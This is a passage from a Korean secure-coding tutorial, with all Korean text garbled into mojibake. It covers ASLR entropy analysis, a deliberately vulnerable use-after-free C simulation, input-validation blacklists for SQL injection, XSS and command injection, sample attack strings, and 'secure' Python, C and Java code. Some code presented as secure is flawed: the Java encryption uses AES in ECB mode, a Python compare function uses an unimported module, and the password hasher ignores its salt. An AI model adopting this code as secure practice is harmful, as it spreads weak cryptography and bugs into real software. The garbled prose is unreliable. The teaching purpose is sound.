                    base_addr = int(executable_regions[0], 16)
                    self.base_addresses.append(base_addr)

                proc.terminate()

            except Exception as e:
                print(f"Error collecting address {i}: {e}")

    def analyze_aslr_entropy(self):
        """ASLR ì—”íŠ¸ë¡œí”¼ ë¶„ì„"""
        unique_addresses = set(self.base_addresses)
        entropy_bits = len(bin(max(unique_addresses) ^ min(unique_addresses))) - 2

        print(f"Collected {len(self.base_addresses)} samples")
        print(f"Unique base addresses: {len(unique_addresses)}")
        print(f"ASLR entropy: ~{entropy_bits} bits")
        print(f"Address range: {hex(min(unique_addresses))} - {hex(max(unique_addresses))}")

        return unique_addresses

    def find_partial_overwrite_target(self):
        """ë¶€ë¶„ ë®ì–´ì“°ê¸°ë¡œ ASLR ìš°íšŒ"""
        # ë§ˆì§€ë§‰ 1-2 ë°”ì´íŠ¸ë§Œ ë¸Œë£¨íŠ¸í¬ìŠ¤
        # 16ë¹„íŠ¸ = 65536ê°€ì§€ ê²½ìš°ì˜ ìˆ˜
        pass

# ì‚¬ìš© ì˜ˆì‹œ
# aslr_bypass = ASLRBypass("./vulnerable")
# aslr_bypass.collect_base_addresses(50)
# aslr_bypass.analyze_aslr_entropy()
```

###### í˜„ëŒ€ì  ë°©ì–´ ê¸°ë²•ë“¤

```bash
# ì»´íŒŒì¼ ì‹œ ë³´ì•ˆ ì˜µì…˜ë“¤
gcc -fstack-protector-strong \     # ê°•í™”ëœ ìŠ¤íƒ ë³´í˜¸
    -D_FORTIFY_SOURCE=2 \          # ë²„í¼ ì˜¤ë²„í”Œë¡œ ê²€ì¶œ
    -fPIE \                        # Position Independent Executable
    -Wl,-z,relro,-z,now \          # RELRO (Relocation Read-Only)
    -Wl,-z,noexecstack \           # NX bit í™œì„±í™”
    vulnerable.c -o secure_binary

# ì‹¤í–‰ ì‹œ ASLR ì„¤ì • í™•ì¸
echo 0 > /proc/sys/kernel/randomize_va_space    # ASLR ë¹„í™œì„±í™”
echo 1 > /proc/sys/kernel/randomize_va_space    # ë³´ìˆ˜ì  ë¬´ì‘ìœ„í™”
echo 2 > /proc/sys/kernel/randomize_va_space    # ì™„ì „ ë¬´ì‘ìœ„í™”
```

##### í™ ì˜¤ë²„í”Œë¡œ ë¶„ì„

###### Use-After-Free ìµìŠ¤í”Œë¡œì‡

```c
// UAF ì·¨ì•½ì ì´ ìˆëŠ” ë¸Œë¼ìš°ì € ì—”ì§„ ì‹œë®¬ë ˆì´ì…˜
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct dom_element {
    char *tag_name;
    void (*render)(struct dom_element *);
    char data[32];
} dom_element_t;

void safe_render(dom_element_t *elem) {
    printf("Rendering safe element: %s\n", elem->tag_name);
}

void malicious_render(dom_element_t *elem) {
    printf("ğŸš¨ Malicious code executed!\n");
    system("echo 'Browser compromised!'");
}

dom_element_t *global_element = NULL;

void create_element(const char *tag) {
    global_element = malloc(sizeof(dom_element_t));
    global_element->tag_name = malloc(strlen(tag) + 1);
    strcpy(global_element->tag_name, tag);
    global_element->render = safe_render;
    strncpy(global_element->data, "safe data", sizeof(global_element->data) - 1);
}

void delete_element() {
    if (global_element) {
        free(global_element->tag_name);
        free(global_element);
        global_element = NULL;  // ì ì ˆí•œ NULL ì„¤ì •
    }
}

void vulnerable_delete() {
    if (global_element) {
        free(global_element->tag_name);
        free(global_element);
        // global_element = NULL; // ëˆ„ë½! (ëŒ•ê¸€ë§ í¬ì¸í„°)
    }
}

void use_element() {
    if (global_element) {
        global_element->render(global_element);  // Use-After-Free!
    }
}

// ê³µê²©ìê°€ ì¡°ì‘í•  ìˆ˜ ìˆëŠ” í• ë‹¹
void attacker_allocation() {
    dom_element_t *fake_element = malloc(sizeof(dom_element_t));
    fake_element->render = malicious_render;  // í•¨ìˆ˜ í¬ì¸í„° ì¡°ì‘
    // ì´ ë©”ëª¨ë¦¬ê°€ ì´ì „ì— í•´ì œëœ global_element ìœ„ì¹˜ì— í• ë‹¹ë  ìˆ˜ ìˆìŒ
}
```

#### 4.1.3 ë³´ì•ˆ ì½”ë”© ì‹¤ì „ ê°€ì´ë“œ

##### OWASP ë³´ì•ˆ ì½”ë”© ì›ì¹™ êµ¬í˜„

###### 1. í¬ê´„ì  ì…ë ¥ ê²€ì¦ (Input Validation)

```python
# ì•ˆì „í•œ ì…ë ¥ ê²€ì¦ ë¼ì´ë¸ŒëŸ¬ë¦¬
import re
import html
import urllib.parse
from typing import Optional, Union
import ipaddress

class SecureInputValidator:
    def __init__(self):
        # ì¼ë°˜ì ì¸ íŒ¨í„´ë“¤
        self.patterns = {
            'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
            'phone': r'^\+?[1-9]\d{1,14}$',  # E.164 format
            'username': r'^[a-zA-Z0-9_]{3,20}$',
            'safe_filename': r'^[a-zA-Z0-9._-]+$',
            'sql_injection': r'(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)\b|[\'";])',
            'xss_patterns': r'(<script|<iframe|javascript:|onload=|onerror=|onmouseover=)',
            'path_traversal': r'(\.\./|\.\.\\|%2e%2e%2f|%2e%2e%5c)',
            'command_injection': r'[;&|`$(){}[\]<>]'
        }

    def validate_input(self, input_value: str, input_type: str, max_length: int = 255) -> dict:
        """
        í¬ê´„ì  ì…ë ¥ ê²€ì¦
        Returns: {'valid': bool, 'sanitized': str, 'errors': list}
        """
        result = {'valid': True, 'sanitized': input_value, 'errors': []}

        # ê¸°ë³¸ ê²€ì‚¬
        if not isinstance(input_value, str):
            result['errors'].append("Input must be a string")
            result['valid'] = False
            return result

        # ê¸¸ì´ ê²€ì‚¬
        if len(input_value) > max_length:
            result['errors'].append(f"Input exceeds maximum length of {max_length}")
            result['valid'] = False

        # NULL ë°”ì´íŠ¸ ê²€ì‚¬
        if '\x00' in input_value:
            result['errors'].append("Null byte detected")
            result['valid'] = False

        # íƒ€ì…ë³„ ê²€ì¦
        if input_type in self.patterns:
            if input_type in ['sql_injection', 'xss_patterns', 'path_traversal', 'command_injection']:
                # ì•…ì„± íŒ¨í„´ ê²€ì‚¬ (blacklist)
                if re.search(self.patterns[input_type], input_value, re.IGNORECASE):
                    result['errors'].append(f"Malicious {input_type} pattern detected")
                    result['valid'] = False
            else:
                # ì •ìƒ íŒ¨í„´ ê²€ì‚¬ (whitelist)
                if not re.match(self.patterns[input_type], input_value):
                    result['errors'].append(f"Invalid {input_type} format")
                    result['valid'] = False

        # ì…ë ¥ ì •í™” (Sanitization)
        if result['valid']:
            result['sanitized'] = self.sanitize_input(input_value, input_type)

        return result

    def sanitize_input(self, input_value: str, input_type: str) -> str:
        """ì…ë ¥ ì •í™”"""
        sanitized = input_value

        # HTML ì—”í‹°í‹° ì¸ì½”ë”©
        if input_type in ['text', 'description']:
            sanitized = html.escape(sanitized)

        # URL ì¸ì½”ë”©
        if input_type == 'url_param':
            sanitized = urllib.parse.quote_plus(sanitized)

        # ê³µë°± ì •ë¦¬
        sanitized = sanitized.strip()

        return sanitized

    def validate_file_upload(self, filename: str, content: bytes, allowed_extensions: list) -> dict:
        """íŒŒì¼ ì—…ë¡œë“œ ê²€ì¦"""
        result = {'valid': True, 'errors': []}

        # íŒŒì¼ëª… ê²€ì¦
        if not re.match(self.patterns['safe_filename'], filename):
            result['errors'].append("Invalid filename characters")
            result['valid'] = False

        # í™•ì¥ì ê²€ì¦ (í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸)
        file_ext = filename.lower().split('.')[-1]
        if file_ext not in allowed_extensions:
            result['errors'].append(f"File extension '{file_ext}' not allowed")
            result['valid'] = False

        # ì´ì¤‘ í™•ì¥ì ê²€ì‚¬
        if filename.count('.') > 1:
            result['errors'].append("Double extension detected")
            result['valid'] = False

        # íŒŒì¼ ì‹œê·¸ë‹ˆì²˜ ê²€ì¦ (Magic Number)
        magic_numbers = {
            'jpg': [b'\xff\xd8\xff'],
            'png': [b'\x89\x50\x4e\x47'],
            'pdf': [b'%PDF'],
            'zip': [b'\x50\x4b\x03\x04', b'\x50\x4b\x05\x06']
        }

        if file_ext in magic_numbers:
            valid_signature = False
            for magic in magic_numbers[file_ext]:
                if content.startswith(magic):
                    valid_signature = True
                    break

            if not valid_signature:
                result['errors'].append("File signature doesn't match extension")
                result['valid'] = False

        # íŒŒì¼ í¬ê¸° ê²€ì¦
        max_size = 10 * 1024 * 1024  # 10MB
        if len(content) > max_size:
            result['errors'].append("File too large")
            result['valid'] = False

        return result

    def validate_ip_address(self, ip_str: str) -> dict:
        """IP ì£¼ì†Œ ê²€ì¦"""
        result = {'valid': True, 'errors': [], 'ip_info': {}}

        try:
            ip = ipaddress.ip_address(ip_str)
            result['ip_info'] = {
                'version': ip.version,
                'is_private': ip.is_private,
                'is_loopback': ip.is_loopback,
                'is_multicast': ip.is_multicast
            }

            # ìœ„í—˜í•œ IP ë²”ìœ„ ê²€ì‚¬
            if ip.is_loopback and not self._is_allowed_loopback():
                result['errors'].append("Loopback address not allowed")
                result['valid'] = False

        except ValueError as e:
            result['errors'].append(f"Invalid IP address: {e}")
            result['valid'] = False

        return result

    def _is_allowed_loopback(self) -> bool:
        """ë£¨í”„ë°± ì£¼ì†Œ í—ˆìš© ì—¬ë¶€ (ì• í”Œë¦¬ì¼€ì´ì…˜ ì •ì±…ì— ë”°ë¼)"""
        return False  # ê¸°ë³¸ì ìœ¼ë¡œ ë¹„í—ˆìš©

# ì‚¬ìš© ì˜ˆì‹œ
validator = SecureInputValidator()

# ì´ë©”ì¼ ê²€ì¦
email_result = validator.validate_input("user@example.com", "email")
print(f"Email validation: {email_result}")

# SQL ì¸ì ì…˜ ê²€ì‚¬
malicious_input = "'; DROP TABLE users; --"
sql_result = validator.validate_input(malicious_input, "sql_injection")
print(f"SQL injection test: {sql_result}")

# íŒŒì¼ ì—…ë¡œë“œ ê²€ì¦
with open("test.jpg", "rb") as f:
    file_content = f.read()
file_result = validator.validate_file_upload("test.jpg", file_content, ["jpg", "png", "gif"])
print(f"File upload validation: {file_result}")
```

###### 2. ì•ˆì „í•œ ì¶œë ¥ ì¸ì½”ë”©

```python
# ì»¨í…ìŠ¤íŠ¸ë³„ ì¶œë ¥ ì¸ì½”ë”©
import html
import json
import urllib.parse
import base64

class SecureOutputEncoder:
    @staticmethod
    def html_encode(data: str) -> str:
        """HTML ì»¨í…ìŠ¤íŠ¸ìš© ì¸ì½”ë”©"""
        return html.escape(data, quote=True)

    @staticmethod
    def javascript_encode(data: str) -> str:
        """JavaScript ì»¨í…ìŠ¤íŠ¸ìš© ì¸ì½”ë”©"""
        # JSON ì¸ì½”ë”© í›„ ì•ˆì „í•œ ë¬¸ìë§Œ ìœ ì§€
        encoded = json.dumps(data)[1:-1]  # ë”°ì˜´í‘œ ì œê±°
        return encoded.replace('<', '\\u003C').replace('>', '\\u003E')

    @staticmethod
    def css_encode(data: str) -> str:
        """CSS ì»¨í…ìŠ¤íŠ¸ìš© ì¸ì½”ë”©"""
        # CSSì—ì„œ íŠ¹ìˆ˜ ì˜ë¯¸ë¥¼ ê°€ì§„ ë¬¸ìë“¤ì„ ì´ìŠ¤ì¼€ì´í”„
        dangerous_chars = ['<', '>', '"', "'", '&', '\\']
        result = data
        for char in dangerous_chars:
            result = result.replace(char, f'\\{ord(char):02X}')
        return result

    @staticmethod
    def url_encode(data: str) -> str:
        """URL ì»¨í…ìŠ¤íŠ¸ìš© ì¸ì½”ë”©"""
        return urllib.parse.quote_plus(data)

    @staticmethod
    def sql_escape(data: str, db_type: str = 'mysql') -> str:
        """SQL ì»¨í…ìŠ¤íŠ¸ìš© ì´ìŠ¤ì¼€ì´í”„ (PreparedStatement ê¶Œì¥)"""
        if db_type == 'mysql':
            return data.replace("'", "''").replace('\\', '\\\\')
        elif db_type == 'postgresql':
            return data.replace("'", "''")
        return data

# í…œí”Œë¦¿ ì—”ì§„ ì˜ˆì‹œ (Jinja2 ìŠ¤íƒ€ì¼)
class SecureTemplateRenderer:
    def __init__(self):
        self.encoder = SecureOutputEncoder()

    def render_html(self, template: str, **kwargs) -> str:
        """HTML í…œí”Œë¦¿ ë Œë”ë§"""
        result = template
        for key, value in kwargs.items():
            if isinstance(value, str):
                safe_value = self.encoder.html_encode(value)
                result = result.replace(f"{{{{{key}}}}}", safe_value)
        return result

    def render_json(self, data: dict) -> str:
        """JSON ë Œë”ë§"""
        return json.dumps(data, ensure_ascii=True, separators=(',', ':'))

# ì‚¬ìš© ì˜ˆì‹œ
encoder = SecureOutputEncoder()
renderer = SecureTemplateRenderer()

# ì‚¬ìš©ì ì…ë ¥
user_input = "<script>alert('XSS')</script>"

# HTML ì»¨í…ìŠ¤íŠ¸
html_safe = encoder.html_encode(user_input)
print(f"HTML safe: {html_safe}")

# JavaScript ì»¨í…ìŠ¤íŠ¸
js_safe = encoder.javascript_encode(user_input)
print(f"JavaScript safe: {js_safe}")

# í…œí”Œë¦¿ ë Œë”ë§
template = "<h1>Welcome {{username}}!</h1>"
safe_html = renderer.render_html(template, username=user_input)
print(f"Template rendered: {safe_html}")
```

###### 3. ì•”í˜¸í™” ë° í•´ì‹œ êµ¬í˜„

```python
# ì•ˆì „í•œ ì•”í˜¸í™” ë° í•´ì‹œ êµ¬í˜„
import hashlib
import secrets
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import argon2

class SecureCryptography:
    def __init__(self):
        self.backend = default_backend()

    def generate_secure_random(self, length: int = 32) -> bytes:
        """ì•”í˜¸í•™ì ìœ¼ë¡œ ì•ˆì „í•œ ëœë¤ ë°”ì´íŠ¸ ìƒì„±"""
        return secrets.token_bytes(length)

    def hash_password(self, password: str, salt: bytes = None) -> dict:
        """Argon2ë¥¼ ì‚¬ìš©í•œ ì•ˆì „í•œ ë¹„ë°€ë²ˆí˜¸ í•´ì‹œ"""
        ph = argon2.PasswordHasher(
            time_cost=3,     # ë°˜ë³µ íšŸìˆ˜
            memory_cost=65536,  # ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ (64MB)
            parallelism=1,   # ë³‘ë ¬ì„±
            hash_len=32      # í•´ì‹œ ê¸¸ì´
        )

        if salt is None:
            salt = self.generate_secure_random(16)

        try:
            password_hash = ph.hash(password)
            return {
                'hash': password_hash,
                'algorithm': 'argon2id',
                'verified': True
            }
        except Exception as e:
            return {'error': str(e), 'verified': False}

    def verify_password(self, password: str, stored_hash: str) -> bool:
        """ë¹„ë°€ë²ˆí˜¸ ê²€ì¦"""
        ph = argon2.PasswordHasher()
        try:
            ph.verify(stored_hash, password)
            return True
        except argon2.exceptions.VerifyMismatchError:
            return False
        except argon2.exceptions.InvalidHash:
            return False

    def encrypt_data(self, plaintext: bytes, password: str) -> dict:
        """AES-256-GCMì„ ì‚¬ìš©í•œ ë°ì´í„° ì•”í˜¸í™”"""
        # ì†”íŠ¸ì™€ nonce ìƒì„±
        salt = self.generate_secure_random(16)
        nonce = self.generate_secure_random(12)  # GCMì—ì„œëŠ” 12ë°”ì´íŠ¸ ê¶Œì¥

        # PBKDF2ë¥¼ ì‚¬ìš©í•œ í‚¤ ìœ ë„
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,  # 256ë¹„íŠ¸ í‚¤
            salt=salt,
            iterations=100000,  # ì¶©ë¶„í•œ ë°˜ë³µ íšŸìˆ˜
            backend=self.backend
        )
        key = kdf.derive(password.encode())

        # AES-256-GCM ì•”í˜¸í™”
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=self.backend)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()

        return {
            'ciphertext': base64.b64encode(ciphertext).decode(),
            'salt': base64.b64encode(salt).decode(),
            'nonce': base64.b64encode(nonce).decode(),
            'tag': base64.b64encode(encryptor.tag).decode(),
            'algorithm': 'AES-256-GCM'
        }

    def decrypt_data(self, encrypted_data: dict, password: str) -> bytes:
        """AES-256-GCMì„ ì‚¬ìš©í•œ ë°ì´í„° ë³µí˜¸í™”"""
        try:
            ciphertext = base64.b64decode(encrypted_data['ciphertext'])
            salt = base64.b64decode(encrypted_data['salt'])
            nonce = base64.b64decode(encrypted_data['nonce'])
            tag = base64.b64decode(encrypted_data['tag'])

            # í‚¤ ìœ ë„
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
                backend=self.backend
            )
            key = kdf.derive(password.encode())

            # ë³µí˜¸í™”
            cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=self.backend)
            decryptor = cipher.decryptor()
            plaintext = decryptor.update(ciphertext) + decryptor.finalize()

            return plaintext

        except Exception as e:
            raise ValueError(f"Decryption failed: {e}")

    def secure_hash(self, data: bytes, algorithm: str = 'sha256') -> str:
        """ì•ˆì „í•œ í•´ì‹œ í•¨ìˆ˜"""
        hash_functions = {
            'sha256': hashlib.sha256,
            'sha384': hashlib.sha384,
            'sha512': hashlib.sha512,
            'sha3_256': hashlib.sha3_256,
            'sha3_512': hashlib.sha3_512
        }

        if algorithm not in hash_functions:
            raise ValueError(f"Unsupported hash algorithm: {algorithm}")

        hash_func = hash_functions[algorithm]
        return hash_func(data).hexdigest()

    def hmac_sign(self, data: bytes, secret_key: bytes, algorithm: str = 'sha256') -> str:
        """HMAC ì„œëª…"""
        import hmac
        hash_functions = {
            'sha256': hashlib.sha256,
            'sha384': hashlib.sha384,
            'sha512': hashlib.sha512
        }

        if algorithm not in hash_functions:
            raise ValueError(f"Unsupported HMAC algorithm: {algorithm}")

        signature = hmac.new(secret_key, data, hash_functions[algorithm])
        return signature.hexdigest()

    def constant_time_compare(self, a: str, b: str) -> bool:
        """íƒ€ì´ë° ê³µê²©ì„ ë°©ì§€í•˜ëŠ” ìƒìˆ˜ ì‹œê°„ ë¹„êµ"""
        return hmac.compare_digest(a, b)

# ì‚¬ìš© ì˜ˆì‹œ
crypto = SecureCryptography()

# ë¹„ë°€ë²ˆí˜¸ í•´ì‹œ
password = "MySecurePassword123!"
password_hash = crypto.hash_password(password)
print(f"Password hash: {password_hash}")

# ë¹„ë°€ë²ˆí˜¸ ê²€ì¦
is_valid = crypto.verify_password(password, password_hash['hash'])
print(f"Password valid: {is_valid}")

# ë°ì´í„° ì•”í˜¸í™”
sensitive_data = b"This is confidential information"
encrypted = crypto.encrypt_data(sensitive_data, "encryption_password")
print(f"Encrypted data: {encrypted}")

# ë°ì´í„° ë³µí˜¸í™”
try:
    decrypted = crypto.decrypt_data(encrypted, "encryption_password")
    print(f"Decrypted: {decrypted.decode()}")
except ValueError as e:
    print(f"Decryption error: {e}")

# ì•ˆì „í•œ í•´ì‹œ
file_hash = crypto.secure_hash(sensitive_data, 'sha256')
print(f"SHA256 hash: {file_hash}")
```

##### ì–¸ì–´ë³„ ë³´ì•ˆ ì½”ë”© ì‹¬í™”

###### C/C++ ë³´ì•ˆ ì½”ë”©

```c
// ì•ˆì „í•œ C í”„ë¡œê·¸ë˜ë° ì˜ˆì‹œ
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <errno.h>

// ì•ˆì „í•œ ë¬¸ìì—´ ë³µì‚¬
int safe_strcpy(char *dest, size_t dest_size, const char *src) {
    if (!dest || !src || dest_size == 0) {
        return -1; // ì˜ëª»ëœ ë§¤ê°œë³€ìˆ˜
    }

    size_t src_len = strlen(src);
    if (src_len >= dest_size) {
        return -1; // ë²„í¼ ì˜¤ë²„í”Œë¡œ ë°©ì§€
    }

    strncpy(dest, src, dest_size - 1);
    dest[dest_size - 1] = '\0'; // null ì¢…ë£Œ ë³´ì¥

    return 0;
}

// ì•ˆì „í•œ ì •ìˆ˜ ë§ì…ˆ (ì˜¤ë²„í”Œë¡œ ê²€ì‚¬)
int safe_add(int a, int b, int *result) {
    if (!result) {
        return -1;
    }

    // ì–‘ìˆ˜ ì˜¤ë²„í”Œë¡œ ê²€ì‚¬
    if (a > 0 && b > 0 && a > INT_MAX - b) {
        return -1; // ì˜¤ë²„í”Œë¡œ
    }

    // ìŒìˆ˜ ì˜¤ë²„í”Œë¡œ ê²€ì‚¬
    if (a < 0 && b < 0 && a < INT_MIN - b) {
        return -1; // ì–¸ë”í”Œë¡œ
    }

    *result = a + b;
    return 0;
}

// ì•ˆì „í•œ ë©”ëª¨ë¦¬ í• ë‹¹
void* safe_malloc(size_t size) {
    if (size == 0 || size > SIZE_MAX / 2) {
        return NULL; // ë„ˆë¬´ í° í• ë‹¹ ìš”ì²­
    }

    void *ptr = malloc(size);
    if (ptr == NULL) {
        fprintf(stderr, "Memory allocation failed: %s\n", strerror(errno));
        return NULL;
    }

    // í• ë‹¹ëœ ë©”ëª¨ë¦¬ ì´ˆê¸°í™”
    memset(ptr, 0, size);
    return ptr;
}

// ì•ˆì „í•œ ë©”ëª¨ë¦¬ í•´ì œ
void safe_free(void **ptr) {
    if (ptr && *ptr) {
        free(*ptr);
        *ptr = NULL; // ëŒ•ê¸€ë§ í¬ì¸í„° ë°©ì§€
    }
}

// ì•ˆì „í•œ ë°°ì—´ ì ‘ê·¼
int safe_array_access(int *array, size_t array_size, size_t index, int *value) {
    if (!array || !value || index >= array_size) {
        return -1; // ê²½ê³„ ê²€ì‚¬ ì‹¤íŒ¨
    }

    *value = array[index];
    return 0;
}

// ì˜ˆì‹œ ì‚¬ìš©
int main() {
    char buffer[64];
    const char *user_input = "Hello, World!";

    // ì•ˆì „í•œ ë¬¸ìì—´ ë³µì‚¬
    if (safe_strcpy(buffer, sizeof(buffer), user_input) == 0) {
        printf("Safe copy: %s\n", buffer);
    }

    // ì•ˆì „í•œ ë©”ëª¨ë¦¬ í• ë‹¹
    int *numbers = (int*)safe_malloc(10 * sizeof(int));
    if (numbers) {
        // ì‚¬ìš©...
        safe_free((void**)&numbers); // ì•ˆì „í•œ í•´ì œ
    }

    return 0;
}
```

###### Java ë³´ì•ˆ ì½”ë”©

```java
// ì•ˆì „í•œ Java í”„ë¡œê·¸ë˜ë° ì˜ˆì‹œ
import java.sql.*;
import java.security.SecureRandom;
import java.io.File;
import java.nio.file.Paths;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class SecureJavaCode {
    private static final Pattern SAFE_FILENAME_PATTERN =
        Pattern.compile("^[a-zA-Z0-9._-]{1,255}$");

    private static final Pattern EMAIL_PATTERN =
        Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");

    // ì•ˆì „í•œ SQL ì¿¼ë¦¬ (PreparedStatement ì‚¬ìš©)
    public User getUserById(Connection conn, int userId) throws SQLException {
        String sql = "SELECT id, username, email FROM users WHERE id = ?";

        try (PreparedStatement stmt = conn.prepareStatement(sql)) {
            stmt.setInt(1, userId); // ë§¤ê°œë³€ìˆ˜í™”ëœ ì¿¼ë¦¬

            try (ResultSet rs = stmt.executeQuery()) {
                if (rs.next()) {
                    return new User(
                        rs.getInt("id"),
                        rs.getString("username"),
                        rs.getString("email")
                    );
                }
            }
        }
        return null;
    }

    // ì•ˆì „í•œ íŒŒì¼ ì ‘ê·¼
    public boolean isValidFilePath(String userPath, String baseDirectory) {
        if (userPath == null || userPath.trim().isEmpty()) {
            return false;
        }

        // íŒŒì¼ëª… íŒ¨í„´ ê²€ì‚¬
        File file = new File(userPath);
        String fileName = file.getName();
        if (!SAFE_FILENAME_PATTERN.matcher(fileName).matches()) {
            return false;
        }

        try {
            // ê²½ë¡œ ì •ê·œí™” ë° ë””ë ‰í† ë¦¬ íŠ¸ë˜ë²„ì„¤ ë°©ì§€
            String normalizedPath = Paths.get(userPath).normalize().toString();
            String normalizedBase = Paths.get(baseDirectory).normalize().toString();

            return normalizedPath.startsWith(normalizedBase);
        } catch (Exception e) {
            return false;
        }
    }

    // ì•ˆì „í•œ ì…ë ¥ ê²€ì¦
    public static class InputValidator {
        public static boolean isValidEmail(String email) {
            return email != null && EMAIL_PATTERN.matcher(email).matches();
        }

        public static boolean isValidUsername(String username) {
            if (username == null || username.length() < 3 || username.length() > 20) {
                return false;
            }
            return username.matches("^[a-zA-Z0-9_]+$");
        }

        public static String sanitizeHTML(String input) {
            if (input == null) return null;

            return input.replace("&", "&amp;")
                       .replace("<", "&lt;")
                       .replace(">", "&gt;")
                       .replace("\"", "&quot;")
                       .replace("'", "&#x27;");
        }
    }

    // ì•ˆì „í•œ ë‚œìˆ˜ ìƒì„±
    public static class SecureRandomGenerator {
        private static final SecureRandom secureRandom = new SecureRandom();

        public static String generateToken(int length) {
            byte[] token = new byte[length];
            secureRandom.nextBytes(token);
            return Base64.getUrlEncoder().withoutPadding().encodeToString(token);
        }

        public static String generateSessionId() {
            return generateToken(32); // 256ë¹„íŠ¸
        }
    }

    // ì•ˆì „í•œ ì•”í˜¸í™” (ì˜ˆì‹œìš©, ì‹¤ì œë¡œëŠ” ë” ë³µì¡í•œ êµ¬í˜„ í•„ìš”)
    public static class SecureEncryption {
        private static final String ALGORITHM = "AES";

        public static String encrypt(String plainText, String secretKey) throws Exception {
            SecretKeySpec keySpec = new SecretKeySpec(secretKey.getBytes(), ALGORITHM);
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, keySpec);

            byte[] encrypted = cipher.doFinal(plainText.getBytes());
            return Base64.getEncoder().encodeToString(encrypted);
        }

        public static String decrypt(String encryptedText, String secretKey) throws Exception {
            SecretKeySpec keySpec = new SecretKeySpec(secretKey.getBytes(), ALGORITHM);
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, keySpec);

            byte[] decrypted = cipher.doFinal(Base64.getDecoder().decode(encryptedText));
            return new String(decrypted);
        }
    }

    // ì‚¬ìš©ì í´ë˜ìŠ¤ ì˜ˆì‹œ
    public static class User {
        private final int id;
        private final String username;
        private final String email;

        public User(int id, String username, String email) {
            this.id = id;
            this.username = username;
            this.email = email;
        }

        // getter ë©”ì„œë“œë“¤...
        public int getId() { return id; }
        public String getUsername() { return username; }
        public String getEmail() { return email; }
    }

    // ì˜ˆì‹œ ì‚¬ìš©ë²•
    public static void main(String[] args) {
        // ì…ë ¥ ê²€ì¦ í…ŒìŠ¤íŠ¸
        String email = "user@example.com";
        System.out.println("Valid email: " + InputValidator.isValidEmail(email));

        // HTML ìƒˆë‹ˆíƒ€ì´ì œì´ì…˜
        String maliciousInput = "<script>alert('XSS')</script>";
        String safeOutput = InputValidator.sanitizeHTML(maliciousInput);
        System.out.println("Sanitized: " + safeOutput);

        // ì•ˆì „í•œ í† í° ìƒì„±
        String sessionId = SecureRandomGenerator.generateSessionId();
        System.out.println("Session ID: " + sessionId);
    }
}
```

#### 4.1.4 ì½”ë“œ ë¦¬ë·° ë° ì •ì  ë¶„ì„ ìë™í™”

##### ì²´ê³„ì  ì½”ë“œ ë¦¬ë·° í”„ë¡œì„¸ìŠ¤

###### ë³´ì•ˆ ì¤‘ì‹¬ ì½”ë“œ ë¦¬ë·° ì²´í¬ë¦¬ìŠ¤íŠ¸

```markdown
# ë³´ì•ˆ ì½”ë“œ ë¦¬ë·° ì²´í¬ë¦¬ìŠ¤íŠ¸

## 1. ì…ë ¥ ê²€ì¦ (Input Validation)

- [ ] ëª¨ë“  ì™¸ë¶€ ì…ë ¥ì— ëŒ€í•œ ê²€ì¦ ë¡œì§ ì¡´ì¬
- [ ] í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê¸°ë°˜ ê²€ì¦ ì‚¬ìš©
- [ ] ì…ë ¥ ê¸¸ì´ ì œí•œ í™•ì¸
- [ ] NULL ë°”ì´íŠ¸ ë° íŠ¹ìˆ˜ ë¬¸ì ê²€ì‚¬
- [ ] íŒŒì¼ ì—…ë¡œë“œ ì‹œ í™•ì¥ì ë° MIME íƒ€ì… ê²€ì¦
- [ ] ìˆ«ì ì…ë ¥ì— ëŒ€í•œ ë²”ìœ„ ê²€ì‚¬

## 2. ì¶œë ¥ ì¸ì½”ë”© (Output Encoding)

- [ ] HTML ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì ì ˆí•œ ì¸ì½”ë”©
- [ ] JavaScript ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì•ˆì „í•œ ì¸ì½”ë”©
- [ ] URL ë§¤ê°œë³€ìˆ˜ ì¸ì½”ë”©
- [ ] SQL ì¿¼ë¦¬ì—ì„œ ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬

## 3. ì¸ì¦ ë° ê¶Œí•œ ë¶€ì—¬

- [ ] ê°•ë ¥í•œ ë¹„ë°€ë²ˆí˜¸ ì •ì±… êµ¬í˜„
- [ ] ì„¸ì…˜ ê´€ë¦¬ ë³´ì•ˆ (íƒ€ì„ì•„ì›ƒ, ë¬´íš¨í™”)
- [ ] ë‹¤ì¤‘ ì¸ì¦(MFA) ê³ ë ¤
- [ ] ê¶Œí•œ ê²€ì‚¬ ë¡œì§ì˜ ì ì ˆì„±
- [ ] ê¸°ë³¸ ê¶Œí•œì´ ìµœì†Œ ê¶Œí•œì¸ì§€ í™•ì¸

## 4. ì•”í˜¸í™” ë° í•´ì‹œ

- [ ] ì•ˆì „í•œ ì•”í˜¸í™” ì•Œê³ ë¦¬ì¦˜ ì‚¬ìš© (AES-256)
- [ ] ì ì ˆí•œ í•´ì‹œ í•¨ìˆ˜ ì‚¬ìš© (SHA-256 ì´ìƒ)
